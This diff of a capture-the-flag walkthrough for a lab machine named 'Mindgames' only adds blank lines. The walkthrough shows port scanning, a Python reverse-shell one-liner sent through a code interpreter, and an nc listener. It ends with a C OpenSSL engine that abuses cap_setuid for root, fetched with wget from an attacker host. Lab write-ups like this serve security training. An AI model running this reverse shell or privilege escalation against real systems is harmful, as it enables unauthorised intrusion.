@@ -12,11 +12,14 @@ No hints. Hack it. Don't give up if you get stuck, enumerate harder
 
 
 PORT   STATE SERVICE
+
 22/tcp open  ssh
+
 80/tcp open  http
 
 
 + we can see that SSH and HTTP are running on the target machine
+
 + lets delve deeper with an advanced nmap scan against these specific ports
 
 
@@ -25,35 +28,47 @@ PORT   STATE SERVICE
 
 
 80/tcp open  http    syn-ack ttl 62 Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
+
 |_http-title: Mindgames.
+
 | http-methods: 
+
 |_  Supported Methods: GET HEAD POST OPTIONS
 
 
 + we get information about both SSH and HTTP but http strikes me as interesting
++ 
 + we have a website called 'mindgames' that accepts the following methods
 
 
 # We enumerate the website for anything
+
 **curl http://10.113.187.44**
 
 
 <form id="codeForm">
+        
         <textarea id="code" placeholder="Enter your code here..."></textarea><br>
+        
         <button>Run it!</button>
+        
 </form>
 
 
 + the code form strikes me as interesting
+  
 + browsing the website manually it appears we can execute brainfuck code in the interpreter
+  
 + what if we manually encoded a python payload to get a reverse shell?
 
 
 # We obtain a reverse shell using a manual exploit against the brainfuck python interpreter
+
 nc -nlvp 8000
 
 
 + grab the following reverse shell from revshells.com
+  
 **import os,pty,socket;s=socket.socket();s.connect(("192.168.136.132",8000));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("sh")**
 
 
@@ -70,6 +85,7 @@ nc -nlvp 8000
 
 
 **mindgames@mindgames:~/webserver$ cd ..**
+
 **mindgames@mindgames:~$ cat user.txt**
 
 
@@ -77,11 +93,14 @@ thm{******38247ff441ce4e13**********}
 
 
 # We search the system for capabilities
+
 **getcap -r / 2>/dev/null**
 
 
 /usr/bin/mtr-packet = cap_net_raw+ep
+
 /usr/bin/openssl = cap_setuid+ep
+
 /home/mindgames/webserver/server = cap_net_bind_service+ep
 
 
@@ -98,14 +117,21 @@ thm{******38247ff441ce4e13**********}
 
 
 #include <openssl/engine.h>
+
 #include <unistd.h>
 
+
 static int bind(ENGINE *e, const char *id) {
+
     setuid(0); setgid(0);
+    
     system("/bin/bash");
+    
 }
 
+
 IMPLEMENT_DYNAMIC_BIND_FN(bind)
+
 IMPLEMENT_DYNAMIC_CHECK_FN()"
 
 
@@ -113,6 +139,7 @@ IMPLEMENT_DYNAMIC_CHECK_FN()"
 
 
 **sudo update**
+
 **sudo apt install libssl-dev**
 
 
@@ -120,6 +147,7 @@ IMPLEMENT_DYNAMIC_CHECK_FN()"
 
 
 **gcc -fPIC -o exploit.o -c exploit.c**
+
 **gcc -shared -o exploit.so -lcrypto exploit.o**
 
 
@@ -133,6 +161,7 @@ IMPLEMENT_DYNAMIC_CHECK_FN()"
 
 
 **mindgames@mindgames:/tmp$ wget http://<your attacker ip>:8000/exploit.so**
+
 **mindgames@mindgames:/tmp$ openssl req -engine ./exploit.so**
 
 
@@ -140,6 +169,7 @@ IMPLEMENT_DYNAMIC_CHECK_FN()"
 
 
 **root@mindgames:/tmp# cd /root**
+
 **root@mindgames:/root# cat root.txt**
 
 
